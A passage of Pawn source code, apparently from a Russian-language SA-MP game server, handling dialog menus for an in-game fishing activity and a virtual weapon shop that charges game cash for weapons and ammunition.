						if(!GetPVarInt(playerid,"fish_rod")) return SCM(playerid,0x81DA99AA," У вас нет удочки");
						if(!GetPVarInt(playerid,"fish_gear")) return SCM(playerid,0x81DA99AA," У вас нет снастей");
						if(!GetPVarInt(playerid,"fish_worms")) return SCM(playerid,0x81DA99AA," У вас нет червей");
						UpdateFish(playerid);
						PlayerTextDrawShow(playerid,FishingText[playerid]);
						SetPlayerAttachedObject(playerid, 0,18632,6,0.079376,0.037070,0.007706,181.482910,0.000000,0.000000,1.000000,1.000000,1.000000);
						SetPVarInt(playerid,"fish_began",1);
						DeletePVar(playerid,"fish_time");
						DeletePVar(playerid,"fish_ready");
					}
					else
					{
						//if(ribachit[playerid] == 1) return SCM(playerid,0x81DA99AA,"В данный момент нельзя завершить рыбалку");
						RemovePlayerAttachedObject(playerid,0);
						DeletePVar(playerid,"fish_began");
						DeletePVar(playerid,"fish_ready");
						DeletePVar(playerid,"fish_time");
						ClearAnimations(playerid);
						PlayerTextDrawHide(playerid,FishingText[playerid]);
					}
				}
			case 1:
				{
					if(!IsAtWormPlace(playerid)) return SCM(playerid,0x81DA99AA," Неудачное место для поиска");
					if(random(2) == 1) ClearAnimations(playerid),ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 6.1, 0, 0, 0, 0, 0,1),  SetPVarInt(playerid,"fish_worms",GetPVarInt(playerid,"fish_worms")+10), SCM(playerid,0x81DA99AA," Вы нашли 10 червей!"), ShowPlayerDialogEx(playerid,1342,DIALOG_STYLE_LIST, "Рыбалка","Начать / Закончить рыбалку\nНакопать червей\nПриготовить рыбу\nСъесть рыбу\nПродать рыбу\nИнформация\nПомощь", "Выбор", "Выход");
					else return ClearAnimations(playerid),ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 6.1, 0, 0, 0, 0, 0,1), SCM(playerid,0x81DA99AA," Вы ничего не нашли"), ShowPlayerDialogEx(playerid,1342,DIALOG_STYLE_LIST, "Рыбалка","Начать / Закончить рыбалку\nНакопать червей\nПриготовить рыбу\nСъесть рыбу\nПродать рыбу\nИнформация\nПомощь", "Выбор", "Выход");
				}
			case 2:
				{
					if(PlayerInfo[playerid][pFishesPach] >= 25) return SCM(playerid,0x81DA99AA," У вас 25 / 25 пачек рыбы");
					if(PlayerInfo[playerid][pFishes] < 20) return SCM(playerid,0x81DA99AA," Для создания требуется 20 кг. рыбы");
					PlayerInfo[playerid][pFishesPach]++;
					PlayerInfo[playerid][pFishes]-=float(20);
					SendMes(playerid,0x81DA99AA," Вы приготовили рыбу. У вас %i / 25 пачек.",PlayerInfo[playerid][pFishesPach]);
					ShowPlayerDialogEx(playerid,1342,DIALOG_STYLE_LIST, "Рыбалка","Начать / Закончить рыбалку\nНакопать червей\nПриготовить рыбу\nСъесть рыбу\nПродать рыбу\nИнформация\nПомощь", "Выбор", "Выход");
				}
			case 3:
				{
					if(PlayerInfo[playerid][pFishesPach] < 1) return SCM(playerid,0x81DA99AA," Недостаточно рыбы");
					PlayerInfo[playerid][pFishesPach]--;
					PlayerInfo[playerid][pSatiety]=100;
					mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
					SendMes(playerid,0x81DA99AA," «Сытость» пополнена до 100. У вас %i / 25 пачек.",PlayerInfo[playerid][pFishesPach]);
					ShowPlayerDialogEx(playerid,1342,DIALOG_STYLE_LIST, "Рыбалка","Начать / Закончить рыбалку\nНакопать червей\nПриготовить рыбу\nСъесть рыбу\nПродать рыбу\nИнформация\nПомощь", "Выбор", "Выход");
				}
			case 4:
				{
					for(new i = 1; i <= TotalBizz; i++)
					{
						if(PlayerInfo[playerid][pFishes] < 2) return SCM(playerid,0x81DA99AA," Недостаточно рыбы");
						if (PlayerToPoint(10, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]) && BizzInfo[i][bType] == 2 && GetPlayerVirtualWorld(playerid) == BizzInfo[i][bVirtualWorld])
						{
							PlayerInfo[playerid][pCash] +=floatround(PlayerInfo[playerid][pFishes])*5;
							if(BizzInfo[i][bProducts]+floatround(PlayerInfo[playerid][pFishes]) < 2000) BizzInfo[i][bProducts]+=floatround(PlayerInfo[playerid][pFishes]);
							else BizzInfo[i][bProducts]=2000;
							format(YCMDstr,sizeof(YCMDstr), " Вы продали %.2f кг. рыбы. Выручка: %i вирт",PlayerInfo[playerid][pFishes],floatround(PlayerInfo[playerid][pFishes]));
							SCM(playerid,0x81DA99AA,YCMDstr);
							PlayerInfo[playerid][pFishes] = 0;
							ShowPlayerDialogEx(playerid,1342,DIALOG_STYLE_LIST, "Рыбалка","Начать / Закончить рыбалку\nНакопать червей\nПриготовить рыбу\nСъесть рыбу\nПродать рыбу\nИнформация\nПомощь", "Выбор", "Выход");
							break;
						}
					}
				}
			case 5:
				{
					format(string,500,"============== Готовность ==============\n\
									\nУдочка:\t- %s\
									\nСнастей:\t- %i шт.\
									\nЧервей:\t- %i шт.\n\n\
									============== Информация ==============\n\n\
									Пачек рыбы приготовлено:\t- %i шт.\
									\nРыбы поймано:\t- %.2f кг.\
									\n\n============== Сонар ==============\n\n\
									Сонар:\t- %s",(!GetPVarInt(playerid,"fish_rod"))?("Нету") : ("Есть"),GetPVarInt(playerid,"fish_gear"),GetPVarInt(playerid,"fish_worms"),
					PlayerInfo[playerid][pFishesPach],PlayerInfo[playerid][pFishes],(!GetPVarInt(playerid,"fish_sonar"))?("Нету") : ("Есть"));
					ShowPlayerDialogEx(playerid,10349,DIALOG_STYLE_MSGBOX, "Информация",string, "Скрыть", "");
				}
			case 6: ShowPlayerDialogEx(playerid,10349,DIALOG_STYLE_MSGBOX, "Помощь по рыбалке","ШАГ 1: Купите удочку и всё необходимое в магазине 24/7\nШАГ 2: Ищите рыбные места для рыбалки\nШАГ 3: Оснастите удочку и наживите червя\nШАГ 4: Подсекайте рыбу клавишей L.ALT", "Скрыть", "");
			}
		}
	case 7925:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(PlayerInfo[playerid][pCash] < 500) return SCM(playerid,-1," Недостаточно денег");
					ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена");
					return 1;
				}
			case 1:
				{
					if(PlayerInfo[playerid][pCash] < 300) return SCM(playerid,-1," Недостаточно денег");
					ShowPlayerDialogEx(playerid, 7928, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена");
					return 1;
				}
			case 2:
				{
					if(PlayerInfo[playerid][pCash] < 750) return SCM(playerid,-1," Недостаточно денег");
					ShowPlayerDialogEx(playerid, 7929, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена");
					return 1;
				}
			case 3:
				{
					if(PlayerInfo[playerid][pCash] < 500) return SCM(playerid,-1," Недостаточно денег");
					ShowPlayerDialogEx(playerid, 7930, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена");
					return 1;
				}
			case 4:
				{
					if(PlayerInfo[playerid][pCash] < 250) return SCM(playerid,-1," Недостаточно денег");
					ShowPlayerDialogEx(playerid, 7931, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена");
					return 1;
				}
			case 5:
				{
					if(PlayerInfo[playerid][pCash] < 500) return SCM(playerid,-1," Недостаточно денег");
					ShowPlayerDialogEx(playerid, 7932, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена");
					return 1;
				}
			case 6:
				{
					if(PlayerInfo[playerid][pCash] < 500) return SCM(playerid,-1," Недостаточно денег");
					ShowPlayerDialogEx(playerid, 7933, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена");
					return 1;
				}
			case 7:
				{
					if(PlayerInfo[playerid][pCash] < 1000) return SCM(playerid,-1," Недостаточно денег");
					ShowPlayerDialogEx(playerid, 7934, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена");
					return 1;
				}
			case 8:
				{
					if(PlayerInfo[playerid][pCash] < 1200) return SCM(playerid,-1," Недостаточно денег");
					PlayerInfo[playerid][pCash]-= 1200; // Отнимаем деньги
					switch(booston)
					{
					case 0:GiveWeapon(playerid,2,1); // Выдаём патроны/оружие
					case 1:GiveWeapon(playerid,2,1*3); // Выдаём патроны/оружие
					}
					format(string,64," Спасибо за покупку. $%i",1*1200);
					SCM(playerid,0x29FF00AA,string);
					ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
					return 1;
				}
			case 9:
				{
					if(PlayerInfo[playerid][pCash] < 1000) return SCM(playerid,-1," Недостаточно денег");
					PlayerInfo[playerid][pCash]-= 1000; // Отнимаем деньги
					switch(booston)
					{
					case 0:GiveWeapon(playerid,5,1); // Выдаём патроны/оружие
					case 1:GiveWeapon(playerid,5,1*3); // Выдаём патроны/оружие
					}
					format(string,64," Спасибо за покупку. $%i",1*1000); // Форматируем сообщение
					SCM(playerid,0x29FF00AA,string);
					ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
					return 1;
				}
			case 10:
				{
					if(PlayerInfo[playerid][pCash] < 1200) return SCM(playerid,-1," Недостаточно денег");
					PlayerInfo[playerid][pCash]-= 1200; // Отнимаем деньги
					switch(booston)
					{
					case 0:GiveWeapon(playerid,6,1); // Выдаём патроны/оружие
					case 1:GiveWeapon(playerid,6,1*3); // Выдаём патроны/оружие
					}
					format(string,64," Спасибо за покупку. $%i",1*1200); // Форматируем сообщение
					SCM(playerid,0x29FF00AA,string);
					ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
					return 1;
				}
			case 11:
				{
					if(PlayerInfo[playerid][pCash] < 1300) return SCM(playerid,-1," Недостаточно денег");
					PlayerInfo[playerid][pCash]-= 1300; // Отнимаем деньги
					switch(booston)
					{
					case 0:GiveWeapon(playerid,7,1); // Выдаём патроны/оружие
					case 1:GiveWeapon(playerid,7,1*3); // Выдаём патроны/оружие
					}
					format(string,64," Спасибо за покупку. $%i",1*1300); // Форматируем сообщение
					SCM(playerid,0x29FF00AA,string);
					ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
					return 1;
				}
			case 12:
				{
					if(PlayerInfo[playerid][pCash] < 2500) return SCM(playerid,-1," Недостаточно денег");
					PlayerInfo[playerid][pCash]-= 2500; // Отнимаем деньги
					switch(booston)
					{
					case 0:GiveWeapon(playerid,8,1); // Выдаём патроны/оружие
					case 1:GiveWeapon(playerid,8,1*3); // Выдаём патроны/оружие
					}
					format(string,64,"Спасибо за покупку. $%i",1*2500); // Форматируем сообщение
					SCM(playerid,0x29FF00AA,string);
					ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
					return 1;
				}
			case 13:
				{
					if(PlayerInfo[playerid][pCash] < 1500) return SCM(playerid,-1," Недостаточно денег");
					PlayerInfo[playerid][pCash]-= 1500; // Отнимаем деньги
					switch(booston)
					{
					case 0:GiveWeapon(playerid,10,1); // Выдаём патроны/оружие
					case 1:GiveWeapon(playerid,10,1*3); // Выдаём патроны/оружие
					}
					format(string,64," Спасибо за покупку. $%i",1*1500); // Форматируем сообщение
					SCM(playerid,0x29FF00AA,string);
					ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
					return 1;
				}
			case 14:
				{
					if(PlayerInfo[playerid][pCash] < 3000) return SCM(playerid,-1," Недостаточно денег");
					PlayerInfo[playerid][pCash]-= 3000; // Отнимаем деньги
					switch(booston)
					{
					case 0:GiveWeapon(playerid,14,1); // Выдаём патроны/оружие
					case 1:GiveWeapon(playerid,14,1*3); // Выдаём патроны/оружие
					}
					format(string,64," Спасибо за покупку. $%i",1*3000); // Форматируем сообщение
					SCM(playerid,0x29FF00AA,string);
					ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
					return 1;
				}
			case 15:
				{
					if(PlayerInfo[playerid][pCash] < 1300) return SCM(playerid,-1,"Недостаточно денег");
					PlayerInfo[playerid][pCash]-= 1300; // Отнимаем деньги
					switch(booston)
					{
					case 0:GiveWeapon(playerid,15,1); // Выдаём патроны/оружие
					case 1:GiveWeapon(playerid,15,1*3); // Выдаём патроны/оружие
					}
					format(string,64," Спасибо за покупку. $%i",1*1300); // Форматируем сообщение
					SCM(playerid,0x29FF00AA,string);
					ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
					return 1;
				}
			case 16:
				{
					if(PlayerInfo[playerid][pCash] < 1000) return SCM(playerid,-1," Недостаточно денег");
					PlayerInfo[playerid][pCash]-= 1000; // Отнимаем деньги
					switch(booston)
					{
					case 0:GiveWeapon(playerid,46,1); // Выдаём патроны/оружие
					case 1:GiveWeapon(playerid,46,1*3); // Выдаём патроны/оружие
					}
					format(string,64," Спасибо за покупку. $%i",1*1000); // Форматируем сообщение
					SCM(playerid,0x29FF00AA,string);
					ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
					return 1;
				}
			}
		}
	case 7927:
		{
			if(response) // Если игрок нажал купить
			{
				new gungins = strval(inputtext);
				if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена"); // Если игрок оставил пустое окно выводим его заного
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*500) return SCM(playerid,-1," Недостаточно денег"); // Проверка хватает ли денег у игрока
				if(gungins > 999 || gungins < 0){ ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Количество патронов не должно быть\nменьше 1 или более 999", "Купить", "отмена");return 1;}
				PlayerInfo[playerid][pCash]-=strval(inputtext)*500; // Отнимаем деньги
				switch(booston)
				{
				case 0:GiveWeapon(playerid,24,gungins); // Выдаём патроны/оружие
				case 1:GiveWeapon(playerid,24,gungins*3); // Выдаём патроны/оружие
				}
				format(string,64," Спасибо за покупку. $%i",strval(inputtext)*500); // Форматируем сообщение
				SCM(playerid,0x29FF00AA,string);
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
				return 1; // Завершаем действие
			}
			else // Если отмена
			{
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
			}
		}
	case 7928:
		{
			if(response) // Если игрок нажал купить
			{
				new gungins = strval(inputtext);
				if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 7928, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена"); // Если игрок оставил пустое окно выводим его заного
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*300) return SCM(playerid,-1," Недостаточно денег"); // Проверка хватает ли денег у игрока
				if(gungins > 999 || gungins < 0){ ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Количество патронов не должно быть\nменьше 1 или более 999", "Купить", "отмена");return 1;}
				PlayerInfo[playerid][pCash]-= strval(inputtext)*300; // Отнимаем деньги
				switch(booston)
				{
				case 0:GiveWeapon(playerid,23,gungins); // Выдаём патроны/оружие
				case 1:GiveWeapon(playerid,23,gungins*3); // Выдаём патроны/оружие
				}
				format(string,64," Спасибо за покупку. $%i",strval(inputtext)*300); // Форматируем сообщение
				SCM(playerid,0x29FF00AA,string);
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
				return 1; // Завершаем действие
			}
			else // Если отмена
			{
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
			}
		}
	case 7929:
		{
			if(response) // Если игрок нажал купить
			{
				new gungins = strval(inputtext);
				if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 7929, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена"); // Если игрок оставил пустое окно выводим его заного
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*750) return SCM(playerid,-1," Недостаточно денег"); // Проверка хватает ли денег у игрока
				if(gungins > 999 || gungins < 0){ ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Количество патронов не должно быть\nменьше 1 или более 999", "Купить", "отмена");return 1;}
				PlayerInfo[playerid][pCash]-=strval(inputtext)*750; // Отнимаем деньги
				switch(booston)
				{
				case 0:GiveWeapon(playerid,33,gungins); // Выдаём патроны/оружие
				case 1:GiveWeapon(playerid,33,gungins*3); // Выдаём патроны/оружие
				}
				format(string,64," Спасибо за покупку. $%i",strval(inputtext)*750); // Форматируем сообщение
				SCM(playerid,0x29FF00AA,string);
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
				return 1; // Завершаем действие
			}
			else // Если отмена
			{
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
			}
		}
	case 7930:
		{
			if(response) // Если игрок нажал купить
			{
				new gungins = strval(inputtext);
				if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 7930, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена"); // Если игрок оставил пустое окно выводим его заного
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*500) return SCM(playerid,-1," Недостаточно денег"); // Проверка хватает ли денег у игрока
				if(gungins > 999 || gungins < 0){ ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Количество патронов не должно быть\nменьше 1 или более 999", "Купить", "отмена");return 1;}
				PlayerInfo[playerid][pCash]-=strval(inputtext)*500; // Отнимаем деньги
				switch(booston)
				{
				case 0:GiveWeapon(playerid,25,gungins); // Выдаём патроны/оружие
				case 1:GiveWeapon(playerid,25,gungins*3); // Выдаём патроны/оружие
				}
				format(string,64," Спасибо за покупку. $%i",strval(inputtext)*500); // Форматируем сообщение
				SCM(playerid,0x29FF00AA,string);
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
				return 1; // Завершаем действие
			}
			else // Если отмена
			{
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
			}
		}
	case 7931:
		{
			if(response) // Если игрок нажал купить
			{
				new gungins = strval(inputtext);
				if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 7931, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена"); // Если игрок оставил пустое окно выводим его заного
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*250) return SCM(playerid,-1," Недостаточно денег"); // Проверка хватает ли денег у игрока
				if(gungins > 999 || gungins < 0){ ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Количество патронов не должно быть\nменьше 1 или более 999", "Купить", "отмена");return 1;}
				PlayerInfo[playerid][pCash]-=strval(inputtext)*250; // Отнимаем деньги
				switch(booston)
				{
				case 0:GiveWeapon(playerid,29,gungins); // Выдаём патроны/оружие
				case 1:GiveWeapon(playerid,29,gungins*3); // Выдаём патроны/оружие
				}
				format(string,64," Спасибо за покупку. $%i",strval(inputtext)*250); // Форматируем сообщение
				SCM(playerid,0x29FF00AA,string);
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
				return 1; // Завершаем действие
			}
			else // Если отмена
			{
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
			}
		}
	case 7932:
		{
			if(response) // Если игрок нажал купить
			{
				new gungins = strval(inputtext);
				if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 7932, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена"); // Если игрок оставил пустое окно выводим его заного
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*500) return SCM(playerid,-1," Недостаточно денег"); // Проверка хватает ли денег у игрока
				if(gungins > 999 || gungins < 0){ ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Количество патронов не должно быть\nменьше 1 или более 999", "Купить", "отмена");return 1;}
				PlayerInfo[playerid][pCash]-=strval(inputtext)*500; // Отнимаем деньги
				switch(booston)
				{
				case 0:GiveWeapon(playerid,30,gungins); // Выдаём патроны/оружие
				case 1:GiveWeapon(playerid,30,gungins*3); // Выдаём патроны/оружие
				}
				format(string,64," Спасибо за покупку. $%i",strval(inputtext)*500); // Форматируем сообщение
				SCM(playerid,0x29FF00AA,string);
